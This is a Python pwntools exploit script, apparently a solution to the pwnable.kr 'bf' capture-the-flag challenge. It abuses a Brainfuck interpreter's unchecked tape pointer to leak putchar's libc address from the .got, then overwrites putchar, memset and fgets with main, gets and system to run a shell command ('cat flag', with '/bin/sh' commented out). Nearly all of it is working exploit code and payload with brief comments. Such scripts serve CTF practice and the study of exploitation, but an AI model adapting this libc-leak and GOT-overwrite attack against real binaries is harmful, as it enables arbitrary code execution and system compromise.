from pwn import *

'''
Review .GOT and .PLT

main:: call printf@plt
  -> printf@plt ;jmp *printf@got
    -> printf@got: 0xf7e835f0
      ->  0xf7e835f0    <printf>:
                            push ebp
                            ...
                            ret
'''

'''
brain_fuck()
'>' ==> p++
'<' ==> p--
'+' ==> *p += 1
'-' ==> *p -= 1
'.' ==> putchar(*p)    ;output *p //(&tape)
',' ==> *p = getchar() ;input *p  //(&tape)
'[' ==> puts("[ and ] not supported.")
'''

# char *p = &0x0804A0A0 (tape), tape is the value which is stored in pointer *p

# 1. get the leak addr of putchar() in .got using '<' '>' to move the pointer
# (0x804A0A0)tape - (0x804A030)putchar = 112
# 2. calc the addr of memset() and fgets() in .got and modify them as following using '+' '-' (because of the sanme params in the two functions)
# memset() -> gets(), fgets() -> system()       (gets("/bin/bash"), system("/bin/bash"))
# 3. modfiy putchat() -> main() in .got to call the gets() and system()

libc = ELF('./bf_libc.so')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

main_addr = 0x8048671
tape_bss = 0x0804A0A0

# addr in .got
putchar_got = 0x0804A030
memset_got = 0x0804A02C
fgets_got = 0x0804A010

# offset addr in .libc
putchar_libc = libc.symbols['putchar']
gets_libc = libc.symbols['gets']
memset_libc = libc.symbols['memset']
system_libc = libc.symbols['system']

def mov_back(n):
    return '<'*n

def intput_overwrite(n):
    return ',>'*n

def read(n):
    return '.>'*n

def call_putchar():
    return '.'

payload = call_putchar()                                  # call putchar(), record the actual putchar() addr in .plt
payload += mov_back(tape_bss - putchar_got)               # *p points to putchar(0x0804A030)
payload += read(0x4)                                      # read actual addr of putchar()
payload += mov_back(0x4)                                  # return back to the first bit of addr of putchar() (0x0804A030)
payload += intput_overwrite(0x4)                          # overwrite putchar() as main()
payload += mov_back(putchar_got - memset_got + 4)         # *p points to memset(0x0804A02C)
payload += intput_overwrite(0x4)                          # overwrite memset as system()
payload += mov_back(memset_got - fgets_got + 4)           # *p points to fgets(0x0804A010)
payload += intput_overwrite(0x4)                          # overwrite fgets() as gets()
payload += call_putchar()                                 # call putchar() who now is main()

# start attacking!
context.log_level = 'debug'
p = remote('pwnable.kr', 9001)
p.recvuntil("except [ ]\n")
# p.sendline(payload)
p.sendline('.<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<.>.>.>.><<<<,>,>,>,><<<<<<<<,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,>,>.')

p.recv(1)                                                   # 1-byte junk data <= '\00' due to line-63 call

putchar_addr = u32(p.recv(4))                               # accept putchar() actual addr

# gdb.attach(p)

# compute the actual addr of gets() and system()
offset_addr = putchar_addr - putchar_libc                   # offset between exe and libc.so
system_addr = offset_addr + system_libc
gets_addr = offset_addr + gets_libc

shell = 'cat flag'
#shell = '/bin/sh'

p.send(p32(main_addr))                                      # overwrite main()
p.send(p32(gets_addr))                                      # overwrite gets()
p.send(p32(system_addr))                                    # overwrite system()
p.recvuntil("except [ ]\n")

p.sendline(shell)
# p.sendline('//bin/sh\0')
log.success(p.recv())
# p.interactive()